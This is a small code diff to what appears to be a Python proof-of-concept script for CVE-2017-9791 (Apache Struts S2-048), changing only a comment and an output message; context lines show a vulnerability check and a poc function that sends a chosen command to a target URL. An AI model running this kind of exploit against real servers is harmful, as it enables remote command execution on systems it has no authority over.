@@ -1,6 +1,6 @@
 '''
 Created on 2017-7-8
-CVE ：CVE-2017-9791
+CVE: CVE-2017-9791
 @author: DragonEgg
 '''
 import sys
@@ -29,7 +29,7 @@ def check(url):
     if 'dragonegg' in res:
         print 's2-048 \033[1;32m EXISTS \033[0m!'
     else:
-        print 's2-048 \033[1;31m do not EXISTS \033[0m!'
+        print 's2-048 \033[1;31m NOT EXISTS \033[0m!'
     
 def poc(url,cmd):
     data=request(cmd)
